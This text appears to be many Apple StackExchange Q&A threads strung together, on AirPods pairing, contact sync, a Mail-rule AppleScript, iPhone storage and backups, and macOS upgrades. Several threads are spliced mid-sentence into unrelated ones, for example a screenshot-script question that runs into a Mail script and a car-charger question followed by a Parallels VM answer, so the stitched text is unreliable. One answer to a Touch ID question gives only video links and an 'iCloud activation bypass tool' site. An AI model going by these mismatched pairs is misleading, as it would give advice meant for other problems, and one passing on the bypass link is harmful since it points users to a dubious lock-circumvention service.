up even more is also higher this way. This is more a theoretical excercise along your intended plans and not really a practical solution.\n\nThe only practical solution for your plans is to let the default Apple installer run its course.  After that finishes, you disable SIP and then disable all those things you do not want. \nOnly this time you do record your steps and pour them into a script, like done here:\n\n\n*\n\n*MacOS disable services or\n\n*Disable bunch of #$!@ in Sierra (Version 2.1)\nThat inconveniences you just a tiny bit more compared to a regular install left at all defaults and is finished after the next update in under 10 minutes. (If Apple didn't change too much under the hood: like introducing new services your  script doesn't know about (and you do neither) or introducing new dependencies to those things you threw out.) Given the status of Mojave your old and slow iMac might benefit from staying away from this bleeding edge. Older OSes do not change so much as is dutifully expected from this newest kid on the block.\nThere is no safe way to do this. Backup hourly. At least. (Having a spare Mac or partition or VM to try this out might be an idea not easily dismissed as well.)\n", "Q: AirPods no longer connect to my Mac I have a Mid-2012 15\" Retina Macbook Pro running 10.13.5 which I have been using my AirPods with successfully since I got them over a year ago.  \nFor some reason, today, when I try to connect them, nothing happens.  I've tried rebooting.  Un-pairing and re-pairing them.

Even when I checked it back on the connection seems to be holding.  I fail to see what Handoff has to do with Bluetooth but at least it works, for now.\n\nA: I've tried everything that has been suggested, but did not work. So I've logged-out of iCloud and tried connecting again, it worked. Just in case if it makes any difference I have the \"Allow Handoff between this Mac and your iCloud devices\" UNCHECKED in General Preferences (as suggested by Darrell Brogdon above.\n\nA: I fixed AirPod pairing by\n\n\n*\n\n*Turning Bluetooth off\n\n*Delete all Bluetooth preference files in /Library/Preferences, /System/Library/Preferences, ~/Library/Preferences\n\n*Restart mac\n\n*\"Forget\" Airpods from iPhone. This removes it from iCloud\n\n*Reset Airpods by holding button until amber light flashes\n\n\nOnly then was I able to connect from my laptop to my Airpods.\n", "Q: How to sync contacts between MacBook and iPhone without iCloud My iPhone and iPad are failing to sync to the Contacts on my Macbook pro.\niTunes shows a menu to allow syncing, but no information is exchanged.\nI'm not using iCloud for my contacts on my iPhone or MacBook Pro but I do want to sync them between both devices. All devices are updated to the latest supported versions of iOS and MacOS as of June 26th, 2018. \nThis is not my question:\nIs there an alternative to using iCloud for managing contacts?\nI have been using iTunes without iCloud for years to sync my phone and the contact list on my computer.\nI now believe the problem is between iTunes and the Contacts application on the Macbook Pro.\n- Changes to groups (add, delete, rename) are not reflected in the iTunes menu for syncing contacts.\n- Changes to contacts made on my computer do NOT propagate to either my iPad or iPhone.\n- Changes to contacts made on either my iPad or iPhone propagate to the other device when both have been synced.\n- Changes to contacts made on either my iPad or iPhone do NOT propagate to the Macbook Pro.\n\nA: With the help of Apple support I have determined that one of the contact records was responsible. When that contact was removed syncing between the computer and the phone was successful. When that contact was included, syncing failed. \nI compared hex dumps of the bad record  and good records and I could find no significant differences. \n", "Q: macOS freezes every few days I've bought iMac 27' in 2017 since the beginning I'm having a very annoying issue with it. On average every two weeks, my mac will freeze to the point where the mouse is still moving, audio continues to play and it even advances to the next songs. Besides the moving mouse and audio in the background, I'm unable to click anything. Usually, it happens when I close an application or when I decide to install updates from apple. Rarely it just happens out of anything.\nI've tried a few things like removing programs cache, unused apps, reset SMC and NVRAM but so far nothing fixed the issue. After upgrade from Sierra to High Sierra it became more often but after updates (I remember that WindowServer had memory leaks), it got back to normal so I can live with it but it's still annoying. Also, I've run Apple's diagnostics to check if everything is okay and it's.\nThe only thing that I've changed in my mac was RAM upgrade so I have 2x4GB (Apple) and 1x16GB (Crucial 16GB DDR4 2400 MT/s (PC4-19200)) so in total, I have 24GB of RAM.\nI've MacBook pro as well which has basically the same set of applications installed and even more and it never happened it so far and I have for over 2 years.\nThe last time it froze was today and I've decided to enable SSH so maybe when it'll happen again I might be still able to SSH and list processes list.\nBesides the issue that I just described I have no other issues.\nDoes anyone have an idea what's going on?\nAdditionally, bellow is the list of apps that I use:\n- Android Studio\n- PyCharm\n- Goland\n- Magnet\n- VirtualBox\n- Vagrant\n- Google Chrome\n- Minecraft\n- iTerm\n- Slack\n- Discord\n- Intelliji Idea\n- Magnet\n- Clocker\n\nOne last thing, after it froze today I've decided to check DiagnosticReports and I've noticed that the last report is about WindowServer and when I checked the date when it happened the last time there was also WindowServer. I'm starting to suspect that it might be a bug in WindowServer but what would I have to do to fix it?\n\nA: Troubleshooting is a process of elimination and often requires patience, but since it seems you don't have a way to bring on a freeze - and because of the time in between incidents of this happening -  it's going to be somewhat slower to diagnose.\nWhile I understand your instinct that it could be a bug with WindowServer, it's actually much more likely to be an issue with how well one of your installed apps is communicating with WindowServer. I'm not familiar with all of the apps you have installed, but if you have anything that hasn't been updated in a long time it may be worth isolating that for a while (i.e. not using it) to see if that makes a difference.\nOne thing worth doing regardless is to boot your iMac into Safe Mode.\nBoot into Safe Mode\nFollow these steps to boot your iMac into Safe Mode:\n\n\n*\n\n*Fully shut down your iMac\n\n*Restart your iMac\n\n*Immediately press the Shift key and keep it down \n\n*Let go of the Shift key when you see the login window (NOTE: If you have FileVault enabled you may need to log in twice).\n\n*Now use your iMac in Safe Mode until it crashes again or until you're satisfied it's not going to crash (i.e. you may be at this step for some days). Of course, some things don't work in Safe Mode, so you may need to exit Safe Mode earlier and boot normally anyway.\n\n*Exit Safe Mode by restarting your iMac as normal\n\n*Once again, test to see if your iMac still crashes\n\n\nLet me know how you go, although it may take you quite some time to know if doing this has helped. \nNOTE: Even just booting into Safe Mode temporarily can be enough to resolve some issues, so it's still worth doing even if you can't stay in Safe Mode for too long.\n", "Q: iPhone \"Other\" storage still present after Erase All Content and Settings Was hoping I could restore it to factory settings and recover some space. I just finished an ‘Erase All Content and Settings’ on my iPhone 6s 16GB. I have not signed into anything, installed any updates, or installed a single app. I did not restore from any backup (iCloud or iTunes). iOS 11.4\nThis is the storage as is stands after the reset:\n\nHow can I clear/recover the 4GB of \"Other\" storage being used? Is there a \"deeper\" wipe than ‘Erase All Content and Settings’ available?\nUpdate: The device has been removed from our MDM program, reset and the storage still remains consumed. \nUpdate: 4 months later, it's gotten worse, the \"other\" usage has consumed over 10gb at this point. Just tried factory reset from itunes instead of the phone itself, did not free any up at all. Device not associated with the MDM program.\n\nA: I understand you haven't installed a single app, but the list shows Self Service, the client side app to a mobile-device-management solution. This is not part of iOS and is a separately installed app. MDM lets the administrator place any files on your iPhone, so it is possible that the space is consumed by data provided through MDM. You can contact your administrator.\n\nA: Is there a \"deeper\" wipe than ‘Erase All Content and Settings’ available?\nYes, in fact there are two.  A restore from Recovery mode.  Slightly deeper is a restore from DFU mode, but it's unlikely to be better in this case.\nTo restore from Recovery mode:\nWith the phone connected to a computer with the latest iTunes:\n\n\n*\n\n*Press the Power and Home buttons and hold them until the phone is switched off.\n\n*Release the Power button and keep holding the Home button till the phone enters the Restore mode.\n\n*Click Restore (not Update) for a \"deeper\" wipe.  This is not the same as a standard restore.\nOther thoughts:Deactivate iPhone Drive? (Source:\nhttps://apple.stackexchange.com/a/323032/33389 )   But you say you \"have not signed into anything\", so it should already be inactive.  Delete all accounts, if any.  Finally, a WAG: It could be due to an extraordinary amount of bad flash that Apple has marked as unavailable. \n\nA: The problem here is you are adding data to the phone after you restore it. Get a clean restore (no need for holding any keys down like DFU or other items) since this is purely about erasing the filesystem and then not adding any apps or accounts.\nThen you’ll know the actual usable storage and be able to decide if you need service due to storage being marked unusable or if you just restore data from backup / cloud to take up that space.\n", "Q: MacBook Pro Mid 2010 13\" freezes/restarts when applying pressure on specific part on the back I own a MacBook Pro Mid 2010 13\" that has been running fine up until now and it has already survived 2-3 minor falls off a table but after the last one every time I apply only slight pressure on the back (more or less around the letter p on the keyboard), for example when I pick it up to carry it around, it crashes. Sometimes the screen freezes (can be in different colors) and then restarts (showing the message \"you need to restart your computer. hold down the power button...\"), sometimes it just freezes without showing this message and it has also been freezing and then making a beep tone and repeating it with a few seconds pause in between. Also, sometimes when I open the MacBook it doesn't \"wake up\" and I have to force it to shut down before I can start it again.\nSometimes those problems also happen if I have a lot of programs running or if I have a lot of tabs open in Safari and sometimes during the freezing or the moment before the fan runs on full speed.\nI've made the following modifications to my MacBook:\n- I've changed the RAM from the original 4GB to 8GB (already a few years ago)\n- I've gotten rid of the optical drive and I now have to SSD's installed (also longer than a year ago)\nI've never had problems after those modifications so the crashes have to be because of the last fall. I've already checked all the connections on the logic board (drives, screen, RAM, battery) but they seem to be ok.\nToday I started the MacBook without the bottom case to try to check exactly where the pressure has to be applied so that it freezes. I used a plastic spudger to apply some slight pressure on different parts of the logic board and found that it only freezes when pressure is applied on the two marked parts on the picture attached. (I know that pressing around on the logic board of a running MacBook is probably not the best thing to do but know at least I know exactly where the problematic parts are and well it still seems to work)\nWhat exactly are those to parts for? And what could be the problem here? A lose connection? Is the only fix to change the logic board?\n\n\nA: I used to repair these computers, but I'm not up-to-date with service options. My answer assumed that the computer hasn't been repaired before.\ntl;dr: I suggest visiting an Apple Store or an Apple Service Provider and asking for a new top case, bottom case, and logic board.\nIt sounds like you're describing two issues:\n\n\n*\n\n*The MacBook crashes when you press in a certain area.\n\n*The MacBook randomly crashes with the \"you need to restart your computer\" message.\n\n\nThe second issue sounds like a kernel panic. That might be a software issue, but more often than not, it's a logic board hardware issue in these Mid-2010 MacBook Pros. There used to be a quality program (or replacement program) for the logic board's video issues, but it has ended. So, odds are, you're overdue for a replacement logic board. But eight years is pretty good for a computer that has survived falls and third-party modifications.\nHowever, replacing the logic board might not resolve the first issue. It sounds like there is something shorting out the logic board, which causes the computer to restart. The \"something\" might be a dent in the top case (the top part of the computer containing the keyboard, power button, and trackpad) or the bottom case (the bottom part screwed into the top case) making contact with the board. I've seen cases like this before where the customer kept coming back for the logic board every time, when it was a dented bottom case all along.\nIn any case, you definitely do need a new logic board if any part of it is damaged. A service technician might be able to offer a more definitive answer. I don't think it's very expensive to get these computers repaired at an Apple Store (it's at least cheaper than a new computer), and I don't think that Apple Stores care very much about third-party modifications.\n\nA: It sounds as if the fall has caused a poor connection, a crack in a circuit board or an intermittent short circuit.\nIt's possible that the poor connection involves one of the two components you've identified and in that case, a skilled service technician might be able to resolder them. However, it's equally possible that the fault is elsewhere and it just happens that pressing at that point causes the board to flex in such a way that it triggers the fault.\nIf you really want to avoid replacing the machine I would try and find a reputable independent repairer and ask them to quote for the repair, but be prepared for it to cost more than it's worth (and make sure you know what if anything they will charge you just for finding out).\nHowever you would probably be best off to sell this machine 'for parts', and replace it with a newer model. If you're on a budget and you want to keep at least one of the SSD's, I suggest looking for a mid-2012 non-Retina model (MD101LL/A) as this is the last MacBook that used a 2.5-inch HDD and this model was still on sale until 2016, so should be supported by OS upgrades for a couple more years yet.\n", "Q: iMac won't recognize my iPhone to upload pictures When I plug my iPhone into my iMac via USB, Dropbox tries to access the pictures, but won't download them. iTunes recognizes the iPhone, but doesn't have a selection to import pictures, only videos. iPhoto doesn't even recognize the iPhone.\nMy iMac is running Mac OS 10.13.5 and my iPhone has the most recent iOS update.\n\nA: The Image Capture app is designed to allow you export images from your iPhone to your iMac. The Photos app can also do this, but then you will need to learn how the Photos app works. \nBoth apps are found in the Applications folder. \n", "Q: Troubleshooting screenshot script BACKGROUND\nAn Automator script to save a screen-capture to a file was developed (by someone more clever than myself).

(This is like one of the Sweep functions on MSLive/Outlook.) I've tried writing a script as follows, which is invoked by the rule:\nusing terms from application \"Mail\"\n    on perform mail action with messages these_messages for rule this_rule\n        tell application \"Mail\"\n            set dateToday to current date\n            set TargetInbox to mailbox \"News\" of account \"iCloud\"\n            set EveryMessage to every message of TargetInbox\n            repeat with eachMessage in these_messages\n                repeat with this_message in EveryMessage\n                    set eachSender to the sender of eachMessage\n                    set this_sender to the sender of this_message\n                    set messageDate to date received of EveryMessage\n                    if messageDate < dateToday and eachSender = this_sender then\n                        delete this_message\n                    end if\n                end repeat\n            end repeat\n        end tell\n    end perform mail action with messages\nend using terms from\n\nI see that the script is called by the rule, because of the spinning gear on the menu bar, but none of the desired deleting occurs, and the script seems to hang in some kind of loop.\nI'm an AppleScript n00b, do much better with JavaScript.  I'd appreciate any help.\nThanks,\nBetalantz\nmacos 10.13.5 | Mail 11.4 | AppleScript 2.7\n\nA: I don't use Mail.app and haven't much experience implementing Mail actions, so am not in the position to test your script.  However, reading through it, there are places in it of potential concern that I would wish to look to first when debugging.\nHow large is your \"News\" mailbox ?\nThere are two features in your script that threaten it to hang or timeout:\n1. set EveryMessage to every message of TargetInbox\nIf that mailbox has thousands or even hundreds of emails in it, retrieving every message as a list of individually referenced message objects (which is what this statement is doing) could take some time.  It's almost always way more efficient and less intensive on processor and memory usage to store a reference to the every message object (collection):\nset EveryMessage to a reference to every message of the TargetInbox\n\nIt has another beneficial feature that I'll address later.\n2. Potentially demanding nested repeat loops\nNested loops are a necessary evil sometimes, but the query about the mailbox size is, again, a source of anxiety for me, especially since its called upon in at the heart of the nest where the bulk of the operations are done.  This means that, for each new message that triggers the script, every single message in the mailbox has to be checked and compared to the trigger message.\nThese are two branches of one issue, really, because if your mailbox only has 5 messages in it, none of this is particularly bothersome.  Otherwise, you're first getting AppleScript to retrieve every message in the mailbox and store them in a variable; then cycling through this potentially heavy load and comparing each item to another.\nIf you had no choice but to use a repeat loop whilst knowing that it would have to iterate through a lot of list items (once you exceed about 500 of anything, AppleScript can begin to buckle) it can help, once again, to pass AppleScript a reference to the list of items instead of the actual list.  Passing any reference through a script object (which is what a reference to essentially does), is much, much faster than making AppleScript access an object by other means.  Here's an excellent explanation and demonstration of these principles.\nSimple changes and error corrections\nAfter addressing the heavy issue above, which could turn out to be of little relevance to your particular case, here are one or two de facto elements that are easily changed to either improve the efficiency of the script, or prevent it throwing an error:\n1. Placement of variable declarations\nset eachSender to the sender of eachMessage\n\nThis line is currently declared inside the inner repeat loop, which also happens to be the the meatier of the two, in general hypothetical terms.  However, what this is doing is setting the value of the variable eachSender to the same value for as many messages you have in your mailbox.  That's a lot of wasted operations for AppleScript (a total of the number of these_messages multplied by the number of EveryMessage).\nInstead, move it to here:\nrepeat with eachMessage in these_messages\n    set eachSender to the sender of eachMessage  # ...now it's here\n    repeat with this_message in EveryMessage\n        # It was here...\n        .\n        .\n        .\n    end repeat\nend repeat\n\nNow AppleScript only has to set the variable once for eachMessage in these_message.  That's an efficiency improvement of polynomial time down to linear time!\n2. set messageDate to date received of EveryMessage\nInitially, I thought you were trying to access the EveryMessage object as a reference to the collection I spoke of earlier, and simply didn't realise you couldn't do that in the way you declared EveryMessage.\nBut, I now realise it was most likely just your hands typing faster than your thoughts, and introducing an irksome typo.  EveryMessage here ought to bethis_message, i.e.:\nset messageDate to date received of this_message\n\nThis leads me quite nicely onto my final point, which I hinted at earlier, regarding the other benefit of declaring a variable to an object collection as a reference.\nHad you done this:\nset EveryMessage to a reference to every message of the TargetInbox\n\nthen this:\nset messageDate to date received of EveryMessage\n\nwould be a perfectly valid piece of AppleScript, which allows you to access the property of every single item in a list IFF done so through a reference to that list before any sort of dereferencing has taken place.  Once it's dereferenced, list is evaluated into individual object references, and it will no longer give you the means to enumerate through its properties in that manner.\nWhat you get if done correctly is list containing the values of the date received property of every message of the TargetInbox, all through a single line of AppleScript.\nCurrently, as this wasn't how you implemented it, the declaration for set messageDate will definitely throw an error.\nThis explains why none of the deletions are occurring, because your script will never successfully reach that part.  However, the error would occur immediately, so my feeling is the script isn't even reaching that line either, not even once.  Therefore, the problem must originate from a point in the script before it ever successfully enters the inner repeat loop.  And you already know my hunch about that.\nNow for a potential solution\nI'm sorry that I can't actually test my script to verify that this will definitely work first time without any tweaks, so tell me how you get on with this:\n    using terms from application \"Mail\"\n        on perform mail action with messages these_messages\n            tell application \"Mail\"\n                set everyMessage to a reference to messages in mailbox \"News\" of account \"iCloud\"\n                repeat with eachMessage in these_messages\n                    delete (everyMessage where ¬\n                        the date received is not the (current date) ¬\n                        and its sender is the sender of eachMessage)\n                end repeat\n            end tell\n        end perform mail action with messages\n    end using terms from\n\nAs you can see, I've done away completely with the inner most repeat loop thanks to the use of the a reference to operator.  As I declared everyMessage in that manner, I am (hopefully) able to enumerate the properties of all the items the list contains in one go, which should be approximately infinity times faster than having to check the property for each item individually.\n\nA: Many thanks to @CJK for such a thorough response.  Your solution works with just one tweak, and I also learned some core concepts for AppleScript.  The working script below now executes quite quickly:\nusing terms from application \"Mail\"\n    on perform mail action with messages these_messages for rule this_rule\n        tell application \"Mail\"\n            set everyMessage to a reference to messages in mailbox \"News\" of account \"iCloud\"\n            repeat with eachMessage in these_messages\n                delete (everyMessage where ¬\n                    the date received is not the (current date) ¬\n                    and its reply to is the reply to of eachMessage)\n            end repeat\n        end tell\n    end perform mail action with messages\nend using terms from\n\nThe script seemed not to execute without the addition on line 2 of for rule this_rule and I surmise it is necessary in order to pass the these_messages object which is the result of the filtering defined in the parent mail.app rule which is invoking the script.\n(At the end of the repeat loop, I changed sender to reply to to handle instances where the sender had changed their self-identifier string on the sending account even though the actual address remained the same, causing the script to miss older emails from the same address.)\nThe key understanding that I was missing is that the EveryMessage object was not automatically passed by reference.  I'm coming from JavaScript, where objects, arrays, and variables are automatically passed by reference, whereas in AppleScript one must declare it as a reference object.\n\nA: I've run into a couple of more issues implementing this script.\n\nThis is the rule which executes my script.  Note that the 'move' command always executes before the script, even if I try to place it after the script execution command.\nMail.app didn't seem to execute the script, and I thought it might be caused by moving the incoming message into the target mailbox first, and then executing the script on the target mailbox. Since the script compares the incoming messages (eachMessage in these_messages) to messages in the target mailbox (everyMessage), perhaps there are no eachMessage objects left after the move executed to use in the script?\nTo test my theory, I decided to incorporate the move command into my script, as follows:\nusing terms from application \"Mail\"\n    on perform mail action with messages these_messages for rule this_rule\n        tell application \"Mail\"\n            set everyMessage to a reference to messages in mailbox \"Charitable appeals\" of account \"iCloud\"\n            repeat with eachMessage in these_messages\n                delete (everyMessage where ¬\n                    the date received is not the (current date) ¬\n                    and (its sender is the sender of eachMessage ¬\n                    or its reply to is equal to the reply to of eachMessage))\n            end repeat\n            repeat with eachMessage in these_messages\n                move eachMessage to mailbox \"Charitable appeals\" of account \"iCloud\"\n            end repeat\n        end tell\n    end perform mail action with messages\nend using terms from\n\nSo now my rule only executes my script on the appropriate incoming messages.\nThe problem now is that, if I Apply Rules manually to a message from mail.app's menu, the script executes as expected, but when the rule runs automatically on incoming messages, mail.app hangs, is not responding, I have to force quit and restart, sometimes first disabling the script.  I thought it might be because there were over 100 messages in the target mailbox, but then I cleaned them up to only have ~50 messages, and hanging persists.\nI would greatly appreciate any help, from @CJK or anyone!\n", "Q: iPhone 7 battery quickly discharges after using Philips dual USB car charger I drove a car for about 3 hours and during the ride my iPhone 7 was connected to the Philips dual USB car charger.

My old Windows 7 VMs run without problems.  \nWhen the VM freezes the Mac Activity Monitor has the Parallels Desktop process is not listed as 'not responding' - the virtual machine process is there too but not marked as not responding - I have to force quit both processes to restart the VM.\nMy Mac is running High Sierra version 10.13.5\nParallels is version 13.3.2\nWindows is Windows 10 build 1803 - OS build 17143.112\nI have made sure I have applied all updates to Parallels, also I have followed the instructions in various knowledge base articles (e.g. https://kb.parallels.com/112091) but unfortunately none have fixed the problem.\nWhat can be done to remedy Windows 10 guest VM performance issues and freezing?\n\nA: I have the same issue with MacOS High Sierra 10.13.6, Parallels 13 and 14 and Microsoft Windows 10 Pro 10.0.16299. Windows 10 worked w/o any problems until recently. Last week we installed Windows updates. \nIn order to reduce the number of possible issues, Parallels support recommends to disable all third party services (to include the ones started during startup). I just did this except for Symantec (this application runs for years w/o problems and would require a de-install). On the list of third party services now disabled are Google and Adobe.\nI'm advised to get back to Parallels support if the problem occurs again.\nUpdate: Today I experienced a sudden crash. Screen of MV and Mac freezed and after a few seconds the Mac rebooted. There was no way to switch to the Mac host. Received a crash dump after the login completed (indicating graphics problems). I'm back on square one. A session/chat with Apple support showed that there are no hardware problems. I was advised to reset SMC and NVRAM/PRAM. Completed both tasks. At the moment I'm testing again. \nUpdate: Since the reset of SMC and NVRAM/PRAM (3 days), the problem has not occurred.\n", "Q: can't get into encrypted .dmg files even though I could the day before and I am 100% certain the password is correct I needed to encrypt a few folders on my MacBook (one of the first of the 'just MacBooks', running High Sierra now, though the problem started under the previous OS). I followed the instructions on https://www.hongkiat.com/blog/encrypt-mac-folder/, basically using Disk Utility to create a .dmg. Right after I created it, I unmounted it and then re-opened it to make sure the process worked as advertised. It did, so I deleted the original, unencrypted folder (which is the whole point of the encryption exercise). The next day, I tried to access this .dmg. It asked me for the password, just as it had the day before. The password is absolutely, positively correct, but it wouldn't accept it. I also tried every way I could conceivably have made a mistake. It just gives me an authentication error, as if the password is wrong, which it 100% is not. I've looked through everything I can find for answers, but they're all either talking about external hard drives (with answers involving wiping them completely or unplugging them), or talking about versions of Disk Utility that offer far more options than mine does (many answers involve sparse bundles, which wasn't an option for me). I desperately need these files - and, as a separate problem, my Time Machine has been acting up for ages, so I don't have a recent enough backup to restore from. Please help! \n\nA: Without backups, all you can do is try variations on your password.  The encryption system would be useless if it had a backdoor to circumvent your password. \n\nThe password is absolutely, positively correct\n\nI suspect that when you setup the DMG what you actually typed in the password field was not exactly what you thought you typed - and you repeated the error. It is possible to consistently type the wrong password - were you typing very quickly, or were you tired, for example?\nTry opening TextEdit and typing in your password many times, see what kind of errors you make when typing quickly,  pressing/not pressing shift, variations with Caps Lock set, accidentally pressing two keys instead of one, vary how you were sitting with respect to the keyboard, etc. You can then copy each password variant from TextEdit into the DMG dialog password field to try to open the DMG. Good luck.\n\nA: Since you can burn an encry dmg file to dvd*, it might be wise in such situations to do so which gives you secure data in 4.7gb pieces to take home, leaving the work computer clean. Emptying Trash is critically dangerous when setting up new processes. Burning the encry dvd and testing it should be step 1 before dumping any trash. \n\n\n*\n\n*I've done a dozen or so and it works but am no expert.\n\n", "Q: How are Sales different from In-App Purchases in iTunes connect?

My old device no longer works and I bought a new iPhone. Setting-up iCloud back-up to the new device requires the code provided to my old device (not working). Any help how to proceed\n\nA: According to this Apple Support page:\nWhen you have two-step verification for your Apple ID, you'll always need at least two of the following to sign in:\n\n\n*\n\n*Your Apple ID password\n\n*Access to one of your trusted devices\n\n*Your Recovery Key\n\n\nIf you've permanently lost any two of these items, you can't sign in or regain access to your account.

I am updating my iPhone from a 6 to 8.\nI wanted to move everything including passwords from the old phone, and I understood that I needed to perform an encrypted backup. \nThe file is 23.33GB vs the 53GB storage used on my phone. Is the file compressed to account for this or does the full backup not include everything on the iPhone?\n\nA: The full backup does not include:\n\n\n*\n\n*iOS itself (since that will already be on the other device),\n\n*app bundles (since they will be downloaded from the App Store again).\n\n\nApp data is backed up even if the apps themselves aren't. It's as full of a backup as is available and will back up all of your data.\n\nA: In addition to @grg answer, backups do not include Media Library (iBooks, iTunes purchases, music, podcasts). Also, app developers decide what to include in the backup, so it would be good to save all important data manually first if it's saved in some app.\np.s. Apps that store sensitive data (like 1Password) usually store it in keychain, so make sure to make an encrypted backup (even with some easy pass like '12345').\n", "Q: What is the purpose of (and criteria for inclusion in) the \"Downloaded\" section of the iTunes Library? I've just upgraded to iTunes 12.7, and there is a new item in the Library section of the sidebar: \"Downloaded\".  When I click on it, I am shown the same set of items that appear in the \"Albums\" section, but sorted by artist name.\nAs far as I am aware none of these items were downloaded from the iTunes store: most were ripped from CD with a few downloaded from other online music providers.\nWhat is the purpose of the \"Downloaded\" section?  Is it an error that it is showing a lot of music that was not downloaded?\nHow might I see a list of music which was actually downloaded from the iTunes store?\n\nA: So, as far as I can tell the \"Downloaded\" section of the iTunes Library is just all music stored on the local machine (i.e., which can be played without needing to stream from the ITMS / iCloud / Apple Music).\nThe name makes sense if you originally obtained all your music by downloading it, but for the rest of us \"Offline\" would be a better name for this section.\n", "Q: How to bypass Touch ID provided access to the iCloud account? If a user has Touch ID on. Then he loses his finger, or dies. How to unlock the phone? Provided he or his family know the iCloud password. \n\nA: Since you have the iPhone password you can unlock the iPhone.\nWithout the iPhone password (or the finger...) (even if you have the Apple ID password) you will not be able gain access to the phone. You can however wipe the phone and use the Apple ID to unlock the phone from Activation Lock.\nSince you have both you can you can wipe the phone and start from new.\n\nA: An iCloud account does not grant local access to a device. Only Touch ID or the device passcode can open the device.\nIf iCloud Backup was enabled on the device and a backup was taken, then the iCloud account can be used to restore this backup to a new device which will give you access to the data.\n\nA: Since Touch ID password is stored on local device. And every device is allowed to enabled for 10 finger by default, it is recommended to have one of the family member for enabling of Touch ID. But if iOS device passcode is aware, then in that case will be able to login into iOS device and add new finger for enabling Touch ID. \n\nA: Follow this step by step tutorial\nhttps://www.youtube.com/watch?v=Ui1u0MZW_HQ\nhttps://www.youtube.com/watch?v=cap0lxqYrEE\nhttps://www.youtube.com/watch?v=lqYfhv1-UkE\nhttps://www.youtube.com/watch?v=l1R_tCRDj8I\nhttps://xdarom.com/icloud-activation-bypass-tool/\n", "Q: Why do macOS/iOS upgrades take so long? Even on an iMac Pro, it still takes some time (maybe 15 minutes) to upgrade the OS (after everything is downloaded). During this time, I can't use the computer.\nWhy is that? What is it actually doing? Why is this process not a simple reboot?\nPlease note I'm not asking why a reboot is required. As a software developer, I'm fully aware of why a reboot is required.\nAlso note A clear reason why an upgrade could take a while is a filesystem migration (such as the HFS+ → APFS migration). Apple did some test migrations, even, before rolling out the final thing. However, most OS upgrades don't involve changes to the filesystem AFAIK.\nThis is a question is similar to Why does the OS X Software Update check take so long? about another upgrade process taking a while. There are specifics of macOS and iOS that are worth considering in answering this question. For example: both ship with drivers necessary for all supported systems.\n\nA: \nWhy is this process not a simple reboot?\n\nThe overall answer here is it depends.  It depends greatly on what needs to be done.  An update that you do to your system may be vastly different than I do on mine.  The update in question may only need a service restarted or it may need updates to the actual kernel.  \n\nWhy is that [I can't use the computer]?\n\nGenerally, for the same reason you can't use an app (Word, Excel, Numbers, iTerm, Adobe Photoshop, etc.) that is in the process of being upgraded. The files must be closed, read, analyzed, the appropriate patches/updates copied over and the app restarted.\nWhen an OS is upgraded, the same thing must happen and this is typically done (when it comes to kernel level upgrades especially) in single user mode.  \nTypically, you'll see updates downloaded, the system will begin a shutdown, updates applied, a reboot, and a \"finalization\" of the updates followed by a normal boot.  You can't use the computer during any of this.\n\nWhat is it actually doing?\n\nIt depends.  It could be anything from patching a config file to flashing firmware of some type.  \n\nIf the system is in /System, why isn't an OS upgrade simply creating a\n  /NewSystem\n\nFirst off, /System is protected by SIP so to disable it, you actually need to boot from a different mount point.*  Secondly, the way you're looking at this is analogous to doing a home renovation by dumping a new house next to the old one and telling the people to just move in.  It's not the way it works.  \nMany things have to happen, least of which is restore points created (in case the backup fails).  So this means a copy of the working system is created, the update applied, the update checked, and (if all good) the restore point deleted.\nIn the case of firmware updates, images have to be verified (i.e. you don't want a Mac mini firmware on your Mac Pro), checksums validated, images backed up, applied, verified, old ones removed and the system reinitialized.  Again, none can be done with you logged in and none of it done by simply \"dumping\" files in a directory.\nAn upgrade is a process and all of this takes time.\n\n* SIP is designed to protect the system by preventing changes to the OS.  Allowing the OS to change the system \"on-the-fly\" would negate the security it's trying to achieve. \n\nA: Rebooting a computer for some operating system updates/upgrades is required for all operating systems, not just macOS.\nActually, in the case of an update, sometimes a reboot isn't required when it is still used as part of an update process, but this is only in instances where it's easier for most of the user population to have to undergo a reboot. For example, some system updates make changes to things like a network service and, while you could get away with just restarting that rather than the whole computer, it's just easier for most users to do a restart than go through the steps to restart the network service.  \nHowever, in most cases that a reboot is required, it's because it's actually necessary. There are many operating system resources that are used by applications, including 3rd party applications, and updating these while the user is logged in just isn't going to be an easy task and, in fact, potentially capable of causing file corruption etc.\nAlso, in cases of firmware updates a reboot is most definitely required. Adding to this, some years back Apple started automatically including firmware updates (if/when required) within macOS updates/upgrades, so it's not easy to check which devices had firmware updates included in an update/upgrade. Regardless though, firmware updates require a reboot, there's just no way around it.\nAnother example is the update of resources required to use hardware. In some cases a reboot is required, in others it isn't. \nFinally, in terms of your last question about why not just create a new system and then having this become active after the next reboot, while this would technically be possible it really isn't practical. The System directory is GBs in size and this would take a lot longer to do and require a much larger amount of free space on the boot volume. \n", "Q: Control + W shortcut not working in Finder and Terminal I set CtrlW as a shortcut for all applications in the System Preferences => Keyboard => Shortcuts.\nThey are working in many apps (like Safari), but not in Terminal and in Finder.\nIs CtrlW a system shortcut?\nI shouldn't have conflicts with other shortcuts with the same combination of keys, the yellow warning triangle is not shown.\n\nA: ControlW is an assigned shortcut in Bash.

My Macbook Air's camera has a handful of broken sensor pixels all clumped together near the middle of the image. They're dead -- always black. When I'm on a video conference or a Facetime, this tends to end up making me look like I have a gap between my teeth or some small black thing stuck to my chin. It's irritating. Replacement will be expensive. I know it's possible to do dead pixel correction in post-production for images or videos, but I can't find a solution that allows me to feed the sensor output through the pixel correction before it gets used by other apps (e.g., Facetime or Skype or Google Hangouts or Slack call or something). \nHow can I find or adapt or build build a software solution for doing dead pixel correction on the sensor's output BEFORE it gets used by other applications?\n\nA: I'm not sure what mechanism you would use to inject your code in to the firmware of the camera and affect the data that the system sends directly to another app. Similarly, modifying the OS would be tricky.\nFor the time and engineering you would put up, it would be far cheaper and quick to just add a USB camera and have a good signal in the first place. Depending on where you ran the code, you might even save power / battery by having a good camera send good data rather than process real time video corrections.\nThat being said, you might be able to use a VR processing type software to send a video stream to an app that's ready to receive it. I don't think you'll have luck with FaceTime or Skype / Teams unless they have a plug in / filter that already does the processing you want before sending the video out.\n", "Q: Open file in Sublime Text tab via AppleScript Using the following AppleScript code, I can open a .txt file in a new window of Sublime Text:\ntell application \"Sublime Text\"\n    open \"Users:me:Desktop:foo.txt\"\nend tell\n\nIs there a way to open this file NOT as its own new window, but rather as a new tab of my existing window of Sublime Text?\n\nA: Sublime Text doesn't provide an AppleScript suite, but does provide a command line utility ‘subl’ in:\n/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl\n\nUsage is available with --help.\nsubl is aware of the current window when opening files and adds the file as a tab.\n/Applications/Sublime\\ 